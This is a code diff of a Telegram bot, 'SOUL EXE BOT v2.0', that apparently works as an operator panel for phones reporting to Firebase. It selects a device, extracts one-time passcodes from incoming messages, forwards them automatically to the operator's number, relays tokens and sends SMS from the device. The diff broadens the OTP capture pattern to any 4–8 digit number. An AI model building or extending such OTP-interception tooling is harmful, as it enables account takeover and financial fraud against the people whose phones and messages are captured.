@@ -148,14 +148,8 @@ function extractOTP(text) {
         /\b(\d{4,8})\b(?=.*?(?:OTP|otp|code|verification|login))/i,
         /(?:login|signup|register)\s+(?:OTP|code)[:\s]*(\d{4,8})/i,
         /(\d{4,8})\s+(?:is your login OTP|is your registration code)/i,
-        /611480/  // Direct match for specific OTP
+        /\b(\d{4,8})\b/  // Any 4-8 digit number as last resort
     ];
-    
-    // Check for exact 6-digit number that appears standalone
-    const standaloneMatch = text.match(/\b(\d{6})\b/);
-    if (standaloneMatch && !text.match(/phone|mobile|contact|call|whatsapp/i)) {
-        return standaloneMatch[1];
-    }
     
     for (const pattern of patterns) {
         const match = text.match(pattern);
@@ -320,8 +314,11 @@ bot.command('setfirebase', async (ctx) => {
     
     let url = args[1];
     if (!url.startsWith('https://')) url = 'https://' + url;
+    if (!url.endsWith('.com') && !url.includes('.firebaseio.com')) {
+        url = url.replace(/\/$/, '');
+    }
     
-    const msg = await ctx.reply('🔄 Connecting...');
+    const msg = await ctx.reply('🔄 Connecting to Firebase...');
     
     try {
         await axios.get(`${url}/.json?shallow=true`, { timeout: 10000 });
@@ -340,7 +337,7 @@ bot.command('setfirebase', async (ctx) => {
         );
     } catch (error) {
         await ctx.telegram.editMessageText(msg.chat.id, msg.message_id, null,
-            `❌ *Failed!*\n\n${error.message}`,
+            `❌ *Connection Failed!*\n\n${error.message}`,
             { parse_mode: 'Markdown' }
         );
     }
@@ -350,27 +347,38 @@ bot.command('setdevice', async (ctx) => {
     const userId = ctx.from.id.toString();
     const args = ctx.message.text.split(' ');
     
-    if (!userData.has(userId)?.firebaseUrl) {
-        return ctx.reply('❌ Use /setfirebase first!', { parse_mode: 'Markdown' });
+    // Check if Firebase is connected
+    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
+        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
     }
     
     const user = userData.get(userId);
     
+    // If device name/ID provided as argument
     if (args.length > 1) {
         const input = args[1];
         const allDevices = await getAllDevices(userId);
-        let found = allDevices.find(d => d.id === input) || allDevices.find(d => d.name.toLowerCase().includes(input.toLowerCase()));
         
-        if (!found) {
-            let list = '📱 *Devices:*\n\n';
-            allDevices.slice(0, 10).forEach(d => {
-                list += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n\n`;
-            });
-            return ctx.reply(`❌ "${input}" not found!\n\n${list}`, { parse_mode: 'Markdown' });
+        if (allDevices.length === 0) {
+            return ctx.reply('❌ No devices found in Firebase!\n\nMake sure devices are connected.', { parse_mode: 'Markdown' });
         }
         
-        const device = await getDevice(userId, found.id);
+        let foundDevice = allDevices.find(d => d.id === input) || 
+                         allDevices.find(d => d.name.toLowerCase().includes(input.toLowerCase()));
+        
+        if (!foundDevice) {
+            let list = '📱 *Available Devices:*\n\n';
+            allDevices.slice(0, 10).forEach(d => {
+                list += `• ${d.name}\n  🆔 \`${d.id}\`\n  📞 ${d.phone}\n  ${d.online ? '🟢 Online' : '🔴 Offline'}\n\n`;
+            });
+            return ctx.reply(`❌ Device "${input}" not found!\n\n${list}`, { parse_mode: 'Markdown' });
+        }
+        
+        const device = await getDevice(userId, foundDevice.id);
+        if (!device) return ctx.reply('❌ Device not found!');
+        
         user.monitoringDevice = device.id;
+        user.processedMsgs = new Set();
         userData.set(userId, user);
         
         return ctx.reply(
@@ -385,8 +393,11 @@ bot.command('setdevice', async (ctx) => {
         );
     }
     
+    // No argument - show device list with pagination
     const devices = await getAllDevices(userId);
-    if (devices.length === 0) return ctx.reply('📭 No devices found!');
+    if (devices.length === 0) {
+        return ctx.reply('📭 *No devices found!*\n\nMake sure devices are connected to Firebase.', { parse_mode: 'Markdown' });
+    }
     
     user.deviceList = devices;
     user.currentPage = 0;
@@ -427,9 +438,15 @@ bot.command('setotpnum', async (ctx) => {
     const userId = ctx.from.id.toString();
     const args = ctx.message.text.split(' ');
     
-    if (!userData.has(userId)?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
-    if (!userData.get(userId).monitoringDevice) return ctx.reply('❌ Use /setdevice first!');
-    if (args.length < 2) return ctx.reply('❌ Usage: `/setotpnum 919715326108`', { parse_mode: 'Markdown' });
+    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
+        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
+    }
+    if (!userData.get(userId).monitoringDevice) {
+        return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
+    }
+    if (args.length < 2) {
+        return ctx.reply('❌ Usage: `/setotpnum 919715326108`', { parse_mode: 'Markdown' });
+    }
     
     const number = args[1].replace('+', '');
     const user = userData.get(userId);
@@ -460,7 +477,9 @@ bot.command('showotpnum', async (ctx) => {
 bot.command('addchannel', async (ctx) => {
     const userId = ctx.from.id.toString();
     
-    if (!userData.has(userId)?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
+    if (!userData.has(userId) || !userData.get(userId).firebaseUrl) {
+        return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
+    }
     
     let channelId, chatTitle = 'Unknown';
     
@@ -468,7 +487,7 @@ bot.command('addchannel', async (ctx) => {
         channelId = ctx.chat.id.toString();
         chatTitle = ctx.chat.title || 'Chat';
     } else {
-        return ctx.reply(`❌ Send this command IN the channel/group\n\n💡 Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
+        return ctx.reply(`❌ Send this command IN the channel/group\n\n💡 Your Chat ID: \`${ctx.chat.id}\``, { parse_mode: 'Markdown' });
     }
     
     const user = userData.get(userId);
@@ -516,10 +535,11 @@ bot.command('startmonitor', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
     
-    if (!user?.firebaseUrl) return ctx.reply('❌ Use /setfirebase first!');
-    if (!user.monitoringDevice) return ctx.reply('❌ Use /setdevice first!');
+    if (!user?.firebaseUrl) return ctx.reply('❌ Use `/setfirebase` first!', { parse_mode: 'Markdown' });
+    if (!user.monitoringDevice) return ctx.reply('❌ Use `/setdevice` first!', { parse_mode: 'Markdown' });
     
-    user.monitorStartTime = new Date().toISOString();
+    const now = new Date();
+    user.monitorStartTime = now.toISOString();
     user.monitorActive = true;
     user.processedMsgs = new Set();
     userData.set(userId, user);
@@ -541,11 +561,11 @@ bot.command('startmonitor', async (ctx) => {
         `📡 Status: ${device?.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n` +
         `📢 Chats: ${user.channels?.length || 0}\n` +
         `🔐 OTP Forward: ${user.otpForwardNumber ? `✅ ${user.otpForwardNumber}` : '❌ Not set'}\n` +
-        `🕐 Started: ${new Date().toLocaleString()}\n\n` +
+        `🕐 Started: ${now.toLocaleString()}\n\n` +
         `✨ *Features:*\n` +
         `🔹 OTPs → Auto-forward to your number\n` +
         `🔹 Tokens (To: X Message: Y) → Forward to any number\n\n` +
-        `🚀 *ACTIVE!*`,
+        `🚀 *MONITORING ACTIVE!*`,
         { parse_mode: 'Markdown' }
     );
 });
@@ -575,13 +595,13 @@ bot.command('resume', async (ctx) => {
         }
     }, 2000);
     userData.set(userId, user);
-    await ctx.reply(`✅ *Resumed!*`, { parse_mode: 'Markdown' });
+    await ctx.reply(`✅ *Monitor Resumed!*`, { parse_mode: 'Markdown' });
 });
 
 bot.command('status', async (ctx) => {
     const userId = ctx.from.id.toString();
     const user = userData.get(userId);
-    if (!user) return ctx.reply('❌ Not configured.');
+    if (!user) return ctx.reply('❌ Not configured. Use `/setfirebase` first.', { parse_mode: 'Markdown' });
     
     const devices = await getAllDevices(userId);
     let deviceInfo = 'Not set', deviceStatus = 'Unknown';
@@ -608,7 +628,7 @@ bot.command('send', async (ctx) => {
     const args = ctx.message.text.split(' ');
     const user = userData.get(userId);
     
-    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.');
+    if (!user?.monitoringDevice) return ctx.reply('❌ No device set.', { parse_mode: 'Markdown' });
     if (args.length < 3) return ctx.reply('❌ Usage: `/send 919876543210 Hello`', { parse_mode: 'Markdown' });
     
     const phone = args[1];
@@ -697,9 +717,13 @@ bot.on('text', async (ctx) => {
 bot.command('admin', async (ctx) => {
     if (!isAdmin(ctx.from.id)) return ctx.reply('❌ Access Denied!');
     await ctx.reply(
-        `👑 *ADMIN*\n\n` +
+        `👑 *ADMIN PANEL*\n\n` +
         `📊 Users: ${userData.size}\n` +
-        `/users - List\n/ban <id>\n/unban <id>\n/broadcast`,
+        `🟢 Active: ${Array.from(userData.values()).filter(u => u.monitorActive).length}\n\n` +
+        `/users - List users\n` +
+        `/ban <id> - Ban user\n` +
+        `/unban <id> - Unban user\n` +
+        `/broadcast <msg> - Send to all`,
         { parse_mode: 'Markdown' }
     );
 });
@@ -773,11 +797,16 @@ bot.command('help', async (ctx) => {
     await ctx.reply(
         `⚡ *COMMANDS*\n\n` +
         `🔧 *SETUP*\n` +
-        `/setfirebase <url>\n/setdevice\n/addchannel\n/startmonitor\n\n` +
+        `/setfirebase <url>\n` +
+        `/setdevice <name/id>\n` +
+        `/addchannel\n` +
+        `/startmonitor\n\n` +
         `🔐 *OTP FORWARD*\n` +
-        `/setotpnum <number>\n/removeotpnum\n/showotpnum\n\n` +
+        `/setotpnum <number>\n` +
+        `/removeotpnum\n` +
+        `/showotpnum\n\n` +
         `📌 *TOKEN FORWARD*\n` +
-        `Send: To: 919876543210\\nMessage: TOKEN\n\n` +
+        `Send in channel: To: 919876543210\\nMessage: TOKEN\n\n` +
         `⚙️ *CONTROL*\n` +
         `/stop /resume /status /send /id`,
         { parse_mode: 'Markdown' }
@@ -795,7 +824,7 @@ bot.action(/^dev_(.+)$/, async (ctx) => {
     const deviceId = ctx.match[1];
     
     const device = await getDevice(userId, deviceId);
-    if (!device) return ctx.editMessageText('❌ Not found');
+    if (!device) return ctx.editMessageText('❌ Device not found');
     
     const user = userData.get(userId);
     user.monitoringDevice = deviceId;
@@ -804,7 +833,13 @@ bot.action(/^dev_(.+)$/, async (ctx) => {
     userData.set(userId, user);
     
     await ctx.editMessageText(
-        `✅ *Device Set!*\n\n📱 ${device.name}\n🆔 \`${device.id}\`\n📞 ${device.phone}\n🔋 ${device.battery}\n📡 ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\nNext: /addchannel or /setotpnum`,
+        `✅ *Device Set!*\n\n` +
+        `📱 Name: ${device.name}\n` +
+        `🆔 ID: \`${device.id}\`\n` +
+        `📞 Phone: ${device.phone}\n` +
+        `🔋 Battery: ${device.battery}\n` +
+        `📡 Status: ${device.online ? '🟢 ONLINE' : '🔴 OFFLINE'}\n\n` +
+        `Next: /addchannel or /setotpnum`,
         { parse_mode: 'Markdown' }
     );
 });
@@ -826,9 +861,10 @@ bot.action('cancel', async (ctx) => {
 
 // ==================== START ====================
 async function main() {
-    console.log('\n🚀 SOUL EXE BOT v2.0');
+    console.log('\n🚀 ========== SOUL EXE BOT v2.0 ==========');
     console.log('✅ OTP Auto-Forward Active');
     console.log('✅ Token Forward Active');
+    console.log('✅ Firebase Connection Fixed');
     console.log('==========================================\n');
     
     bot.launch();
